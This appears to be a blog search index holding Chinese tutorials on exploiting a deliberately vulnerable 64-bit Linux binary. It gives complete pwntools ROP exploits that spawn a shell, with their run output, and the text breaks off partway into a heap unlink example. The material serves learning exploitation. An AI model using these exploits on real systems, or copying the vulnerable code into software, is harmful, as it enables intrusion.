<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[64位linux下栈溢出漏洞利用]]></title>
      <url>http://yoursite.com/2017/10/15/64%E4%BD%8Dlinux%E4%B8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>linux_64与linux_86的区别有：可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
<p>有很多代码都是借鉴一步一步x64教程中的，就不自己写了，然后发现x64教程中有很多问题，自己手动调试写了exp，漏洞源码vuln.c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">![#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">void vulnerable_function() &#123;</div><div class="line">    char buf[128];</div><div class="line">    read(STDIN_FILENO, buf, 512);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">    write(STDOUT_FILENO, &quot;pwn it\n&quot;, 7);</div><div class="line">    vulnerable_function();</div><div class="line">&#125;](http://note.youdao.com/favicon.ico)</div></pre></td></tr></table></figure></p>
<p>编译命令：<br>gcc -fno-stack-protector vuln.c -o vuln</p>
<p>编译好之后，利用gdb调试vuln。我的gdb配合了peda和pwndbg这两个工具，看起来更加直观清楚。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Reading symbols from vuln...done.</div><div class="line">pwndbg&gt; pattern create 150</div><div class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA&apos;</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/hackyzh/Desktop/pwn/vuln </div><div class="line">Hello, World</div><div class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line"></div><div class="line">--------------------------------</div><div class="line">pwndbg&gt; x/gx $rsp</div><div class="line">0x7fffffffdeb8:	0x41416d4141514141</div></pre></td></tr></table></figure>
<p>观察以上调试信息，可以观察到$rsp处的值为0x41416d4141514141，通过gdb-peda来计算溢出的地方，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; pattern_offset 0x41416d4141514141</div><div class="line">4702159612987654465 found at offset: 136</div></pre></td></tr></table></figure></p>
<p>得到offset之后我们就可以尝试控制rip寄存器的值，返回到我们想要执行的地方。通过python命令来输出payload<br>python -c ‘print “A”*136+”AAAAAA\x00\x00”‘ &gt; payload。之后进行gdb调试，运行刚刚产生的payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">RAX: 0x91 </div><div class="line">RBX: 0x0 </div><div class="line">RCX: 0x7ffff7b00330 (&lt;__read_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)</div><div class="line">RDX: 0x200 </div><div class="line">RSI: 0x7fffffffde30 (&apos;A&apos; &lt;repeats 15 times&gt;...)</div><div class="line">RDI: 0x0 </div><div class="line">RBP: 0x4141414141414141 (&apos;AAAAAAAA&apos;)</div><div class="line">RSP: 0x7fffffffdec0 --&gt; 0x7fffffffdf0a --&gt; 0x49010c6ebf104ce </div><div class="line">RIP: 0x414141414141 (&apos;AAAAAA&apos;)</div><div class="line">R8 : 0x7ffff7dd4e80 --&gt; 0x0 </div><div class="line">R9 : 0x7ffff7dea700 (&lt;_dl_fini&gt;:	push   rbp)</div><div class="line">R10: 0x7fffffffdbf0 --&gt; 0x0 </div><div class="line">R11: 0x246 </div><div class="line">R12: 0x400490 (&lt;_start&gt;:	xor    ebp,ebp)</div><div class="line">R13: 0x7fffffffdfb0 --&gt; 0x1 </div><div class="line">R14: 0x0 </div><div class="line">R15: 0x0</div><div class="line">EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)</div></pre></td></tr></table></figure></p>
<p>观察到rip寄存器的值已经被我们控制。<br>写exp前先可以理解下这篇文章 <a href="http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&amp;utm_medium=referral。" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3298.html?utm_source=tuicool&amp;utm_medium=referral。</a></p>
<h2 id="0x01-有libc情况下的利用"><a href="#0x01-有libc情况下的利用" class="headerlink" title="0x01 有libc情况下的利用"></a>0x01 有libc情况下的利用</h2><p>最终可以的exp如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(&apos;vuln&apos;)</div><div class="line">libc = ELF(&apos;libc.so.6&apos;)</div><div class="line"></div><div class="line">p = process(&apos;./vuln&apos;)</div><div class="line"></div><div class="line">got_write = elf.got[&apos;write&apos;]</div><div class="line">print &quot;got_write: &quot; + hex(got_write)</div><div class="line">got_read = elf.got[&apos;read&apos;]</div><div class="line">print &quot;got_read: &quot; + hex(got_read)</div><div class="line"></div><div class="line">start = 0x400490</div><div class="line">poprdi=0x400633</div><div class="line">off_system_addr = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]</div><div class="line">print &quot;off_system_addr: &quot; + hex(off_system_addr)</div><div class="line"></div><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x40062a) +p64(0) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(1) # pop_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(start)</div><div class="line"></div><div class="line">p.recvuntil(&quot;pwn it\n&quot;)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload1#############\n&quot;</div><div class="line">p.send(payload1)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line">write_addr = u64(p.recv(8))</div><div class="line">print &quot;write_addr: &quot; + hex(write_addr)</div><div class="line"></div><div class="line">system_addr = write_addr - off_system_addr</div><div class="line">print &quot;system_addr: &quot; + hex(system_addr)</div><div class="line"></div><div class="line">bss_addr=0x601048</div><div class="line"></div><div class="line">p.recvuntil(&quot;pwn it\n&quot;)</div><div class="line"></div><div class="line"></div><div class="line">payload2 =  &quot;\x00&quot;*136</div><div class="line">payload2 += p64(0x40062a) + p64(0) + p64(1) + p64(got_read) + p64(8) + p64(bss_addr) + p64(0) # pop_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload2 += p64(0x400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload2 += &quot;\x00&quot;*56</div><div class="line">payload2 += p64(start)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload2#############\n&quot;</div><div class="line">p.send(payload2)</div><div class="line">sleep(1)</div><div class="line">p.send(&quot;/bin/sh\0&quot;)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload3 =  &quot;\x00&quot;*136</div><div class="line">payload3 += p64(poprdi)+p64(bss_addr)</div><div class="line">payload3 += p64(system_addr)</div><div class="line">payload3 += p64(start)</div><div class="line"></div><div class="line">print &quot;\n#############sending payload3#############\n&quot;</div><div class="line"></div><div class="line">sleep(1)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>以上地址可以用objdump -d vuln得出，运行结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">[*] &apos;/home/hackyzh/Desktop/pwn/vuln&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] &apos;/home/hackyzh/Desktop/pwn/libc.so.6&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">[+] Starting local process &apos;./vuln&apos;: pid 1769</div><div class="line">got_write: 0x601018</div><div class="line">got_read: 0x601020</div><div class="line">off_system_addr: 0xa8df0</div><div class="line"></div><div class="line">#############sending payload1#############</div><div class="line"></div><div class="line">write_addr: 0x7ffff7b00380</div><div class="line">system_addr: 0x7ffff7a57590</div><div class="line"></div><div class="line">#############sending payload2#############</div><div class="line"></div><div class="line"></div><div class="line">#############sending payload3#############</div><div class="line"></div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">$ id</div><div class="line">uid=1000(hackyzh) gid=1000(hackyzh) groups=1000(hackyzh),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure></p>
<h2 id="0x02-无libc的情况下"><a href="#0x02-无libc的情况下" class="headerlink" title="0x02 无libc的情况下"></a>0x02 无libc的情况下</h2><p>最终的exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from pwn import *</div><div class="line">elf = ELF(&apos;vuln&apos;)</div><div class="line">p = process(&apos;./vuln&apos;)</div><div class="line"></div><div class="line"></div><div class="line">got_write = elf.got[&apos;write&apos;]</div><div class="line">print &quot;got_write: &quot;+ hex(got_write)</div><div class="line">got_read = elf.got[&apos;read&apos;]</div><div class="line">print &quot;got_read: &quot; + hex(got_read)</div><div class="line"></div><div class="line">start = 0x400490</div><div class="line">bss_addr=0x601048</div><div class="line">poprdi=0x400633</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def leak(address):</div><div class="line">    payload1 =  &quot;\x00&quot;*136</div><div class="line">    payload1 += p64(0x40062a) +p64(0) + p64(1) + p64(got_write) + p64(8) + p64(address) + p64(1) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">    payload1 += p64(0x400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">    payload1 += &quot;\x00&quot;*56</div><div class="line">    payload1 += p64(start)</div><div class="line">    p.send(payload1)</div><div class="line">    p.recvuntil(&quot;pwn it\n&quot;)</div><div class="line">    data=p.recv(8)</div><div class="line">    print &quot;%#x =&gt; %s&quot;% (address, (data or &apos;&apos;).encode(&apos;hex&apos;))</div><div class="line">    return data</div><div class="line">d=DynELF(leak, elf=ELF(&apos;./vuln&apos;))</div><div class="line">system_addr=d.lookup(&apos;__libc_system&apos;,&apos;libc&apos;)</div><div class="line">print &quot;systemAddress:&quot;, hex(system_addr)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload2 =  &quot;\x00&quot;*136</div><div class="line">payload2 += p64(0x40062a) + p64(0) + p64(1) + p64(got_read) + p64(8) + p64(bss_addr) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload2 += p64(0x400610) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div><div class="line">payload2 += &quot;\x00&quot;*56</div><div class="line">payload2 += p64(start)</div><div class="line"></div><div class="line">print &quot;\n#############Write /bin/sh#############\n&quot;</div><div class="line">p.send(payload2)</div><div class="line">sleep(1)</div><div class="line">p.send(&quot;/bin/sh\0&quot;)</div><div class="line">sleep(1)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">print &quot;\n#############Get Shell#############\n&quot;</div><div class="line">payload3 =  &quot;\x00&quot;*136</div><div class="line">payload3 += p64(poprdi)+p64(bss_addr)</div><div class="line">payload3 += p64(system_addr)</div><div class="line">payload3 += p64(start)</div><div class="line">sleep(1)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>运行结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line">[*] &apos;/home/hackyzh/Desktop/pwn/vuln&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[+] Starting local process &apos;./vuln&apos;: pid 2242</div><div class="line">got_write: 0x601018</div><div class="line">got_read: 0x601020</div><div class="line">0x400000 =&gt; 7f454c4602010100</div><div class="line">[+] Loading from &apos;/home/hackyzh/Desktop/pwn/vuln&apos;: 0x7ffff7ffe1c8</div><div class="line">0x601008 =&gt; c8e1fff7ff7f0000</div><div class="line">[+] Resolving &apos;__libc_system&apos; in &apos;libc.so&apos;: 0x7ffff7ffe1c8</div><div class="line">0x600e28 =&gt; 0100000000000000</div><div class="line">0x600e38 =&gt; 0c00000000000000</div><div class="line">0x600e48 =&gt; 0d00000000000000</div><div class="line">0x600e58 =&gt; 1900000000000000</div><div class="line">0x600e68 =&gt; 1b00000000000000</div><div class="line">0x600e78 =&gt; 1a00000000000000</div><div class="line">0x600e88 =&gt; 1c00000000000000</div><div class="line">0x600e98 =&gt; f5feff6f00000000</div><div class="line">0x600ea8 =&gt; 0500000000000000</div><div class="line">0x600eb8 =&gt; 0600000000000000</div><div class="line">0x600ec8 =&gt; 0a00000000000000</div><div class="line">0x600ed8 =&gt; 0b00000000000000</div><div class="line">0x600ee8 =&gt; 1500000000000000</div><div class="line">0x600ef8 =&gt; 0300000000000000</div><div class="line">0x600f00 =&gt; 0010600000000000</div><div class="line">0x7ffff7ffe1e8 =&gt; 0000000000000000</div><div class="line">0x7ffff7ffe1d0 =&gt; 58e7fff7ff7f0000</div><div class="line">0x7ffff7ffe758 =&gt; 0000000000000000</div><div class="line">0x7ffff7ffe1e0 =&gt; 60e7fff7ff7f0000</div><div class="line">0x7ffff7ffe768 =&gt; f0ebfff7ff7f0000</div><div class="line">0x7ffff7ffebf0 =&gt; 0000000000000000</div><div class="line">0x7ffff7ffe778 =&gt; c074fff7ff7f0000</div><div class="line">0x7ffff7ff74c8 =&gt; a074fff7ff7f0000</div><div class="line">0x7ffff7ff74a0 =&gt; 2f6c69622f783836</div><div class="line">0x7ffff7ff74a8 =&gt; 5f36342d6c696e75</div><div class="line">0x7ffff7ff74b0 =&gt; 782d676e752f6c69</div><div class="line">0x7ffff7ff74b8 =&gt; 62632e736f2e3600</div><div class="line">0x7ffff7ff74c0 =&gt; 0010a1f7ff7f0000</div><div class="line">[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.</div><div class="line">0x7ffff7a11000 =&gt; 7f454c4602010100</div><div class="line">0x7ffff7ff74d0 =&gt; a02bddf7ff7f0000</div><div class="line">0x7ffff7dd2ba0 =&gt; 0100000000000000</div><div class="line">0x7ffff7dd2bb0 =&gt; 0e00000000000000</div><div class="line">0x7ffff7dd2bc0 =&gt; 0c00000000000000</div><div class="line">0x7ffff7dd2bd0 =&gt; 1900000000000000</div><div class="line">0x7ffff7dd2be0 =&gt; 1b00000000000000</div><div class="line">0x7ffff7dd2bf0 =&gt; 0400000000000000</div><div class="line">0x7ffff7dd2c00 =&gt; f5feff6f00000000</div><div class="line">0x7ffff7dd2c10 =&gt; 0500000000000000</div><div class="line">0x7ffff7dd2c20 =&gt; 0600000000000000</div><div class="line">0x7ffff7dd2c30 =&gt; 0a00000000000000</div><div class="line">0x7ffff7dd2c40 =&gt; 0b00000000000000</div><div class="line">0x7ffff7dd2c50 =&gt; 0300000000000000</div><div class="line">0x7ffff7dd2c58 =&gt; 0030ddf7ff7f0000</div><div class="line">0x7ffff7a11010 =&gt; 03003e0001000000</div><div class="line">0x7ffff7dd3008 =&gt; c074fff7ff7f0000</div><div class="line">0x7ffff7ff74e0 =&gt; 60e7fff7ff7f0000</div><div class="line">0x7ffff7ffe780 =&gt; c8e1fff7ff7f0000</div><div class="line">0x7ffff7a11180 =&gt; 4400000000000000</div><div class="line">[*] Magic did not match</div><div class="line">[*] .gnu.hash/.hash, .strtab and .symtab offsets</div><div class="line">[*] Found DT_GNU_HASH at 0x7ffff7dd2c00</div><div class="line">0x7ffff7dd2c08 =&gt; b812a1f7ff7f0000</div><div class="line">[*] Found DT_STRTAB at 0x7ffff7dd2c10</div><div class="line">0x7ffff7dd2c18 =&gt; c81da2f7ff7f0000</div><div class="line">[*] Found DT_SYMTAB at 0x7ffff7dd2c20</div><div class="line">0x7ffff7dd2c28 =&gt; 304da1f7ff7f0000</div><div class="line">[*] .gnu.hash parms</div><div class="line">0x7ffff7a112b8 =&gt; f30300000a000000</div><div class="line">0x7ffff7a112c0 =&gt; 000100000e000000</div><div class="line">[*] hash chain index</div><div class="line">0x7ffff7a11f3c =&gt; 4102000044020000</div><div class="line">[*] hash chain</div><div class="line">0x7ffff7a13370 =&gt; c08106920c7e6fff</div><div class="line">0x7ffff7a18348 =&gt; c32d000012000c00</div><div class="line">0x7ffff7a24b8b =&gt; 5f5f6c6962635f73</div><div class="line">0x7ffff7a24b93 =&gt; 797374656d007474</div><div class="line">0x7ffff7a18350 =&gt; 9065040000000000</div><div class="line">systemAddress: 0x7ffff7a57590</div><div class="line"></div><div class="line">#############Write /bin/sh#############</div><div class="line"></div><div class="line"></div><div class="line">#############Get Shell#############</div><div class="line"></div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">Hello, World</div><div class="line">$ id</div><div class="line">uid=1000(hackyzh) gid=1000(hackyzh) groups=1000(hackyzh),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure></p>
<h2 id="0x03-更加直接暴力的方法"><a href="#0x03-更加直接暴力的方法" class="headerlink" title="0x03 更加直接暴力的方法"></a>0x03 更加直接暴力的方法</h2><p>假如代码直接用strcpy造成的溢出，不能泄漏内存地址的话，可以直接搜索system地址和/bin/sh地址，接着构造rop链。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; b main</div><div class="line">Breakpoint 1 at 0x4005a1</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/hackyzh/Desktop/pwn/vuln</div><div class="line">......</div><div class="line">pwndbg&gt; p system</div><div class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7ffff7a57590 &lt;__libc_system&gt;</div><div class="line">pwndbg&gt; p exit</div><div class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7ffff7a4d1e0 &lt;__GI_exit&gt;</div></pre></td></tr></table></figure></p>
<p>最终构造exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">libc = ELF(&apos;libc.so.6&apos;)</div><div class="line">elf = ELF(&apos;vuln&apos;)</div><div class="line">p=process(&apos;./vuln&apos;)</div><div class="line">poprdi=0x400633</div><div class="line">system_addr=0x7ffff7a57590</div><div class="line"></div><div class="line">exit=0x7ffff7a4d1e0</div><div class="line"></div><div class="line">binsh_addr = system_addr - (libc.symbols[&apos;system&apos;] - next(libc.search(&apos;/bin/sh&apos;)))</div><div class="line">print &apos;binsh_addr= &apos; + hex(binsh_addr)</div><div class="line">print &quot;\n#############Get Shell#############\n&quot;</div><div class="line">payload3 =  &quot;\x00&quot;*136</div><div class="line">payload3 += p64(poprdi)+p64(binsh_addr)</div><div class="line">payload3 += p64(system_addr)</div><div class="line">payload3 += p64(exit)</div><div class="line">sleep(1)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>还可以简化exp，在找到binsh_addr后硬编码。</p>
<h2 id="0x04-结论"><a href="#0x04-结论" class="headerlink" title="0x04 结论"></a>0x04 结论</h2><p>参考文章非常经典，不过里面的代码有误，可以结合上面的链接一起看，然后自己手动调试，很容易搞懂。本人水平有限，如有错误望斧正。</p>
<p>参考：<a href="http://cb.drops.wiki/drops/papers-7551.html" target="_blank" rel="external">http://cb.drops.wiki/drops/papers-7551.html</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux堆溢出之利用unsafe unlink]]></title>
      <url>http://yoursite.com/2017/10/15/linux%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8B%E5%88%A9%E7%94%A8unsafe-unlink/</url>
      <content type="html"><![CDATA[<p>最近重新复习了一下堆的相关知识，发现以前理解的不透彻，然后忘的好彻底。然后现在重新捡起来看看，发现捡起来也很费力看着别人的例子，理解了一下，例子就是绕过unsafe unlink的例子。unlink.c如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"> </div><div class="line">#define MAX_INDEX 9</div><div class="line">#define NOTE_SIZE 0x80</div><div class="line">//we want to be big enough not to use fastbins</div><div class="line"> </div><div class="line">char **notes;</div><div class="line"> </div><div class="line">void handle_cmd(int cmd, int note_index, char * note,int note_size)</div><div class="line">&#123;</div><div class="line">    switch (cmd)</div><div class="line">    &#123;</div><div class="line">        case 0: //malloc</div><div class="line">            notes[note_index]=(char 